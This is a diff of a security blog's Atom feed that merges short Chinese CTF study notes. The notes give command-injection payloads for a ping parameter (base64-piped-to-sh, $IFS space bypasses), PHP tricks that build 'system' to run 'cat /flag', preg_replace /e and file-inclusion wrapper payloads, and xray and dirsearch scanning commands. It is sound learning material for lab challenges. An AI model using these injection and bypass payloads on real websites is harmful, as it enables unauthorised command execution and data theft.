@@ -6,7 +6,7 @@
   <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
   
   <link href="https://sakurahack-y.github.io/"/>
-  <updated>2021-09-19T16:24:50.156Z</updated>
+  <updated>2021-10-08T15:00:59.301Z</updated>
   <id>https://sakurahack-y.github.io/</id>
   
   <author>
@@ -17,91 +17,58 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title></title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/%E5%AF%BB%E6%89%BEflag%E6%96%87%E4%BB%B6%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/%E5%AF%BB%E6%89%BEflag%E6%96%87%E4%BB%B6%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
-    <published>2021-10-08T09:42:39.765Z</published>
-    <updated>2021-09-19T16:24:50.156Z</updated>
-    
-    <content type="html"><![CDATA[<p>知识点：寻找flag文件常用命令小结：</p><pre><code>system(‘ls’) : 列举当前目录下的所有文件system(“find / -name flag*”)：查找所有文件名匹配flag*的文件system(“cat $(find / -name flag*)”)：打印所有文件名匹配flag*的文件</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;知识点：寻找flag文件常用命令小结：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;system(‘ls’) : 列举当前目录下的所有文件
-system(“find / -name flag*”)：查找所有文件名匹配flag*的文件
-system(“cat $(find / -name </summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
+    <title>小知识点</title>
     <link href="https://sakurahack-y.github.io/2021/10/08/%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
     <published>2021-10-08T09:42:39.759Z</published>
-    <updated>2021-09-25T08:04:23.361Z</updated>
+    <updated>2021-10-08T15:00:59.301Z</updated>
     
-    <content type="html"><![CDATA[<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);<br>$a=’system’;<br>$a(‘ls’);</p>]]></content>
+    <content type="html"><![CDATA[<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);<br>$a=’system’;<br>$a(‘ls’);</p><p>寻找flag文件常用命令小结：<br>    system(‘ls’) : 列举当前目录下的所有文件<br>    system(“find / -name flag<em>”)：查找所有文件名匹配flag</em>的文件<br>    system(“cat $(find / -name flag*)”)：打印所有文件名匹配flag*的文件</p>]]></content>
     
     
       
       
     <summary type="html">&lt;p&gt;php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);&lt;br&gt;$a=’system’;&lt;br&gt;$a(‘ls’);&lt;/p&gt;
-</summary>
+&lt;p&gt;寻找flag文件常用命令小结：&lt;br&gt;    system(‘ls’) :</summary>
       
     
     
     
+    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
+    
+    <category term="杂" scheme="https://sakurahack-y.github.io/categories/CTF/%E6%9D%82/"/>
+    
+    
+    <category term="小知识点" scheme="https://sakurahack-y.github.io/tags/%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
     
   </entry>
   
   <entry>
-    <title></title>
+    <title>常见绕过方法</title>
     <link href="https://sakurahack-y.github.io/2021/10/08/%E7%BB%95%E8%BF%87/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/%E7%BB%95%E8%BF%87/</id>
     <published>2021-10-08T09:42:39.755Z</published>
-    <updated>2021-09-25T09:47:59.906Z</updated>
+    <updated>2021-10-08T15:01:07.207Z</updated>
     
-    <content type="html"><![CDATA[<p>sh</p><p>/?ip=127.0.0.1;echo$IFS$2Y2F0IGZsYWcucGhw|base64$IFS$2-d|sh</p><p>变量拼接：<br>/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php</p><p>内联注释(将反引号命令的结果作为输入来执行命令)<br>/?ip=127.0.0.1;cat$IFS$2<code>ls</code></p><p>查看命令补充<br>    cat     由第一行开始显示内容，并将所有内容输出<br>    tac     从最后一行倒序显示内容，并将所有内容输出<br>    more    根据窗口大小，一页一页的现实文件内容<br>    less    和more类似，但是是从后往前翻页并且，进行可以搜索字符<br>    head    只显示头几行<br>    tail    只显示最后几行<br>    nl      类似于cat -n，显示时输出行号</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;sh&lt;/p&gt;
-&lt;p&gt;/?ip=127.0.0.1;echo$IFS$2Y2F0IGZsYWcucGhw|base64$IFS$2-d|sh&lt;/p&gt;
-&lt;p&gt;变量拼接：&lt;br&gt;/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php&lt;/p&gt;
-&lt;p&gt;内联注释(将</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/%E8%BF%9B%E5%88%B6/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/%E8%BF%9B%E5%88%B6/</id>
-    <published>2021-10-08T09:42:39.750Z</published>
-    <updated>2021-09-25T08:55:55.597Z</updated>
-    
-    <content type="html"><![CDATA[<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);</p><p>$a=’system’;<br>$a(‘ls’);</p><p>常用函数：base_convert(“1001”2,10)是将二进制的1001转换为10进制<br>dechex 10进制转成16进制<br>hex2bin  16进制转成字符串的函数<br>_GET</p><p><a href="http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p=%7B&#39;system&#39;};$$p">http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p={&#39;system&#39;};$$p</a>(cat /flag)<br>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi=system&amp;abs=cat /flag<br>$_GET{pi}($_GET{abs})  pi=system abs=cat /flag<br>本来是$_GET[]   –&gt;如果[]被过滤可以用$_GET{}</p>]]></content>
+    <content type="html"><![CDATA[<p>空格替代:<br>    ${IFS}<br>    $IFS$9<br>    &lt;<br>    &lt;&gt;<br>    {,}</p><hr><p>sh</p><p>/?ip=127.0.0.1;echo$IFS$2Y2F0IGZsYWcucGhw|base64$IFS$2-d|sh</p><p>变量拼接：<br>/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php</p><p>内联注释(将反引号命令的结果作为输入来执行命令)<br>/?ip=127.0.0.1;cat$IFS$2<code>ls</code></p><p>查看命令补充<br>    cat     由第一行开始显示内容，并将所有内容输出<br>    tac     从最后一行倒序显示内容，并将所有内容输出<br>    more    根据窗口大小，一页一页的现实文件内容<br>    less    和more类似，但是是从后往前翻页并且，进行可以搜索字符<br>    head    只显示头几行<br>    tail    只显示最后几行<br>    nl      类似于cat -n，显示时输出行号</p><hr><p>进制绕过<br>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);</p><p>$a=’system’;<br>$a(‘ls’);</p><p>常用函数：base_convert(“1001”2,10)是将二进制的1001转换为10进制<br>dechex 10进制转成16进制<br>hex2bin  16进制转成字符串的函数<br>_GET</p><p><a href="http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p=%7B&#39;system&#39;};$$p">http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p={&#39;system&#39;};$$p</a>(cat /flag)<br>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi=system&amp;abs=cat /flag<br>$_GET{pi}($_GET{abs})  pi=system abs=cat /flag<br>本来是$_GET[]   –&gt;如果[]被过滤可以用$_GET{}</p>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);&lt;/p&gt;
-&lt;p&gt;$a=’system’;&lt;br&gt;$a(‘ls’);&lt;/p&gt;
-&lt;p&gt;常用函数：base_convert(“1001”2,10)是将二进</summary>
+    <summary type="html">&lt;p&gt;空格替代:&lt;br&gt;    ${IFS}&lt;br&gt;    $IFS$9&lt;br&gt;    &amp;lt;&lt;br&gt;    &amp;lt;&amp;gt;&lt;br&gt;    {,}&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;sh&lt;/p&gt;
+&lt;p&gt;/?ip=127.0.0.1;echo$IFS$2Y2F0IGZsYWcucGhw|</summary>
       
     
     
     
+    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
+    
+    <category term="绕过" scheme="https://sakurahack-y.github.io/categories/CTF/%E7%BB%95%E8%BF%87/"/>
+    
+    
+    <category term="绕过" scheme="https://sakurahack-y.github.io/tags/%E7%BB%95%E8%BF%87/"/>
     
   </entry>
   
@@ -132,13 +99,13 @@ system(“cat $(find / -name </summary>
   </entry>
   
   <entry>
-    <title></title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/xray%E5%91%BD%E4%BB%A4/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/xray%E5%91%BD%E4%BB%A4/</id>
+    <title>常见软件命令</title>
+    <link href="https://sakurahack-y.github.io/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/"/>
+    <id>https://sakurahack-y.github.io/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/</id>
     <published>2021-10-08T09:42:39.740Z</published>
-    <updated>2021-09-11T15:53:44.890Z</updated>
+    <updated>2021-10-08T14:57:52.190Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="单个url检测"><a href="#单个url检测" class="headerlink" title="单个url检测"></a>单个url检测</h1><p>./xray_windows_amd64 webscan –url <a href="https://xxx.edu.cn/">https://xxx.edu.cn</a> –html-output edu.html</p><h1 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h1><p>./xray_windows_amd64 webscan –url-file edu.txt –html-output e du.html</p><p> E:\sakura的工具箱\扫描\xray\xray_windows_amd64.exe webscan –url-file C:\Users\Sakura\Desktop\target.txt –html-output C:\Users\Sakura\Desktop\edus.html</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="单个url检测"><a href="#单个url检测" class="headerlink" title="单个url检测"></a>单个url检测</h1><p>./xray_windows_amd64 webscan –url <a href="https://xxx.edu.cn/">https://xxx.edu.cn</a> –html-output edu.html</p><h1 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h1><p>./xray_windows_amd64 webscan –url-file edu.txt –html-output e du.html</p><p> E:\sakura的工具箱\扫描\xray\xray_windows_amd64.exe webscan –url-file C:\Users\Sakura\Desktop\target.txt –html-output C:\Users\Sakura\Desktop\edus.html</p><p>dirsearch常见命令:<br>python dirsearch.py  -u <a href="http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/">http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/</a> -e * –timeout=2 -t 1 -x 400,403,404,500,503,429 -o C:\Users\Sakura\Desktop\1.txt</p>]]></content>
     
     
       
@@ -148,98 +115,47 @@ system(“cat $(find / -name </summary>
     
     
     
+    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="软件常用命令" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E8%BD%AF%E4%BB%B6%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+    
+    
+    <category term="软件命令" scheme="https://sakurahack-y.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/"/>
     
   </entry>
   
   <entry>
-    <title></title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/require_once/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/require_once/</id>
-    <published>2021-10-08T09:42:39.735Z</published>
-    <updated>2021-09-20T17:17:27.274Z</updated>
-    
-    <content type="html"><![CDATA[<p>require_once(dirname(<strong>FILE</strong>).”/./config_uc.php”);<br>一、<strong>FILE</strong> php定义的为当前文件路径及文件名的常量，如: d:/wwwroot/dedecms/index.php<br>二、dirname(<strong>FILE</strong>) 为函数，取得文件路径的目录名；<br>echo dirname(“d:/wwwroot/dedecms/index.php”）结果为：d:/wwwroot/dedecms<br>三、require_once(dirname(<strong>FILE</strong>).”/./config_uc.php”); 假设当前文件为d:/wwwroot/dedecms/index.php结果为<br>require_once(“d:/wwwroot/dedecms/config_uc.php”);</p><p>另外/./config_uc.php 中./为当前目录</p><p>require_once(str_replace(‘/tieba’,’’,dirname(<strong>FILE</strong>)).”/./config_uc.php”); </p><p>“/./config_uc.php” 这个就是文件路径了<br>/./应该是表示当前目录<br>/../可以表示上级目录</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;require_once(dirname(&lt;strong&gt;FILE&lt;/strong&gt;).”/./config_uc.php”);&lt;br&gt;一、&lt;strong&gt;FILE&lt;/strong&gt; php定义的为当前文件路径及文件名的常量，如: d:/wwwroot/dedecms/in</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/preg_replace%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/preg_replace%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
-    <published>2021-10-08T09:42:39.730Z</published>
-    <updated>2021-09-19T17:40:24.669Z</updated>
-    
-    <content type="html"><![CDATA[<p>pre_replace /e模式是要在正则匹配到特定特征的字符串直接当作php代码来执行，执行结果替换原字符，相当于eval函数。<br>payload:next.php?\S*=${getflag()}&amp;cmd=system(‘ls /‘);</p><p>绕过preg_match的话可以使用\绕过，比如在linux下执行l\s，效果等同于ls</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;pre_replace /e模式是要在正则匹配到特定特征的字符串直接当作php代码来执行，执行结果替换原字符，相当于eval函数。&lt;br&gt;payload:next.php?\S*=${getflag()}&amp;amp;cmd=system(‘ls /‘);&lt;/p&gt;
-&lt;p&gt;绕过p</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
+    <title>PHP文件包含常见协议</title>
     <link href="https://sakurahack-y.github.io/2021/10/08/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/</id>
     <published>2021-10-08T09:42:39.719Z</published>
-    <updated>2021-09-20T08:53:43.537Z</updated>
+    <updated>2021-10-08T14:56:18.197Z</updated>
     
-    <content type="html"><![CDATA[<p>php&gt;=5.2</p><p>php://filter协议   ?file=file://D:/soft/phpStudy/WWW/phpcode.txt<br>php://input协议  ?file=php://filter/read=convert.base64-encode/resource=./index.php<br>data://协议<br>data://协议允许读入<br> 要求：打开allow_url_fopen  allow_url_include<br>?file=data://text/plain,<?php phpinfo()?><br>?file=data://text/plain;base64,编码</p><p>file协议：<br>file:///文件路径</p>]]></content>
+    <content type="html"><![CDATA[<p>php&gt;=5.2<br>php://filter协议   ?file=file://D:/soft/phpStudy/WWW/phpcode.txt<br>php://input协议  ?file=php://filter/read=convert.base64-encode/resource=./index.php<br>data://协议<br>data://协议允许读入<br> 要求：打开allow_url_fopen  allow_url_include<br>?file=data://text/plain,<?php phpinfo()?><br>?file=data://text/plain;base64,编码</p><p>file协议：<br>file:///文件路径</p><p>如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件</p>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;php&amp;gt;=5.2&lt;/p&gt;
-&lt;p&gt;php://filter协议   ?file=file://D:/soft/phpStudy/WWW/phpcode.txt&lt;br&gt;php://input协议  ?file=php://filter/read=convert.base6</summary>
+    <summary type="html">&lt;p&gt;php&amp;gt;=5.2&lt;br&gt;php://filter协议   ?file=file://D:/soft/phpStudy/WWW/phpcode.txt&lt;br&gt;php://input协议  ?file=php://filter/read=convert.base64-en</summary>
       
     
     
     
+    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
+    
+    <category term="文件包含" scheme="https://sakurahack-y.github.io/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    
+    
+    <category term="php" scheme="https://sakurahack-y.github.io/tags/php/"/>
     
   </entry>
   
   <entry>
-    <title></title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/PHP%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/PHP%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/</id>
-    <published>2021-10-08T09:42:39.714Z</published>
-    <updated>2021-09-07T06:17:53.847Z</updated>
-    
-    <content type="html"><![CDATA[<p>如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
+    <title>nginx重要文件位置</title>
     <link href="https://sakurahack-y.github.io/2021/10/08/nginx%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE/"/>
     <id>https://sakurahack-y.github.io/2021/10/08/nginx%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE/</id>
     <published>2021-10-08T09:42:39.708Z</published>
-    <updated>2021-09-30T14:57:53.958Z</updated>
+    <updated>2021-10-08T14:49:20.986Z</updated>
     
     <content type="html"><![CDATA[<p>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>]]></content>
     
@@ -251,68 +167,39 @@ system(“cat $(find / -name </summary>
     
     
     
+    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
+    
+    <category term="杂" scheme="https://sakurahack-y.github.io/categories/CTF/%E6%9D%82/"/>
+    
+    
+    <category term="nginx" scheme="https://sakurahack-y.github.io/tags/nginx/"/>
     
   </entry>
   
   <entry>
-    <title></title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/intval%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D%E5%92%8C%E7%BB%95%E8%BF%87/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/intval%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D%E5%92%8C%E7%BB%95%E8%BF%87/</id>
+    <title>PHP文件包含常见协议</title>
+    <link href="https://sakurahack-y.github.io/2021/10/08/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8/"/>
+    <id>https://sakurahack-y.github.io/2021/10/08/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8/</id>
     <published>2021-10-08T09:42:39.703Z</published>
-    <updated>2021-09-25T09:24:49.295Z</updated>
+    <updated>2021-10-08T14:56:55.625Z</updated>
     
-    <content type="html"><![CDATA[<p>intval() 函数用于获取变量的整数值。</p><p>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>PHP 4, PHP 5, PHP 7<br>语法</p><p>int intval ( mixed $var [, int $base = 10 ] )</p><pre><code>$var：要转换成 integer 的数量值。$base：转化所使用的进制。</code></pre><p>intval()函数的使用方式，发现如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值而对于科学计数法+数字则会返回字符串类型<br>示例：<br>&lt;?php<br>$num=’2e4’;<br>echo(intval($num));  ——-&gt;2<br>echo(intval($num+1));———&gt;20001</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;intval() 函数用于获取变量的整数值。&lt;/p&gt;
-&lt;p&gt;intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。&lt;/p</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/dirsearch%E5%91%BD%E4%BB%A4/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/dirsearch%E5%91%BD%E4%BB%A4/</id>
-    <published>2021-10-08T09:42:39.698Z</published>
-    <updated>2021-09-19T14:33:39.055Z</updated>
-    
-    <content type="html"><![CDATA[<p>python dirsearch.py  -u <a href="http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/">http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/</a> -e * –timeout=2 -t 1 -x 400,403,404,500,503,429 -o C:\Users\Sakura\Desktop\1.txt</p>]]></content>
+    <content type="html"><![CDATA[<p>pre_replace /e模式是要在正则匹配到特定特征的字符串直接当作php代码来执行，执行结果替换原字符，相当于eval函数。<br>payload:next.php?\S*=${getflag()}&amp;cmd=system(‘ls /‘);</p><h2 id="绕过preg-match的话可以使用-绕过，比如在linux下执行l-s，效果等同于ls"><a href="#绕过preg-match的话可以使用-绕过，比如在linux下执行l-s，效果等同于ls" class="headerlink" title="绕过preg_match的话可以使用\绕过，比如在linux下执行l\s，效果等同于ls"></a>绕过preg_match的话可以使用\绕过，比如在linux下执行l\s，效果等同于ls</h2><h2 id="call-user-func-函数-参数-，返回值为函数执行参数后的结果"><a href="#call-user-func-函数-参数-，返回值为函数执行参数后的结果" class="headerlink" title="call_user_func(函数, 参数)，返回值为函数执行参数后的结果"></a>call_user_func(函数, 参数)，返回值为函数执行参数后的结果</h2><p>intval() 函数用于获取变量的整数值。</p><p>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>PHP 4, PHP 5, PHP 7<br>语法</p><p>int intval ( mixed $var [, int $base = 10 ] )</p><pre><code>$var：要转换成 integer 的数量值。$base：转化所使用的进制。</code></pre><p>intval()函数的使用方式，发现如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值而对于科学计数法+数字则会返回字符串类型<br>示例：<br>&lt;?php<br>$num=’2e4’;<br>echo(intval($num));  ——-&gt;2<br>echo(intval($num+1));———&gt;20001</p><hr><p>require_once(dirname(<strong>FILE</strong>).”/./config_uc.php”);<br>一、<strong>FILE</strong> php定义的为当前文件路径及文件名的常量，如: d:/wwwroot/dedecms/index.php<br>二、dirname(<strong>FILE</strong>) 为函数，取得文件路径的目录名；<br>echo dirname(“d:/wwwroot/dedecms/index.php”）结果为：d:/wwwroot/dedecms<br>三、require_once(dirname(<strong>FILE</strong>).”/./config_uc.php”); 假设当前文件为d:/wwwroot/dedecms/index.php结果为<br>require_once(“d:/wwwroot/dedecms/config_uc.php”);</p><p>另外/./config_uc.php 中./为当前目录</p><p>require_once(str_replace(‘/tieba’,’’,dirname(<strong>FILE</strong>)).”/./config_uc.php”); </p><p>“/./config_uc.php” 这个就是文件路径了<br>/./应该是表示当前目录<br>/../可以表示上级目录</p>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;python dirsearch.py  -u &lt;a href=&quot;http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/&quot;&gt;http://7580b1d4-c607-4a67-a008-092706787</summary>
+    <summary type="html">&lt;p&gt;pre_replace /e模式是要在正则匹配到特定特征的字符串直接当作php代码来执行，执行结果替换原字符，相当于eval函数。&lt;br&gt;payload:next.php?\S*=${getflag()}&amp;amp;cmd=system(‘ls /‘);&lt;/p&gt;
+&lt;h2 id</summary>
       
     
     
     
+    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
     
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/call_user_func/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/call_user_func/</id>
-    <published>2021-10-08T09:42:39.693Z</published>
-    <updated>2021-09-19T16:27:11.712Z</updated>
-    
-    <content type="html"><![CDATA[<p>call_user_func(函数, 参数)，返回值为函数执行参数后的结果</p>]]></content>
+    <category term="常见函数" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
     
     
-      
-      
-    <summary type="html">&lt;p&gt;call_user_func(函数, 参数)，返回值为函数执行参数后的结果&lt;/p&gt;
-</summary>
-      
-    
-    
-    
+    <category term="php" scheme="https://sakurahack-y.github.io/tags/php/"/>
     
   </entry>
   
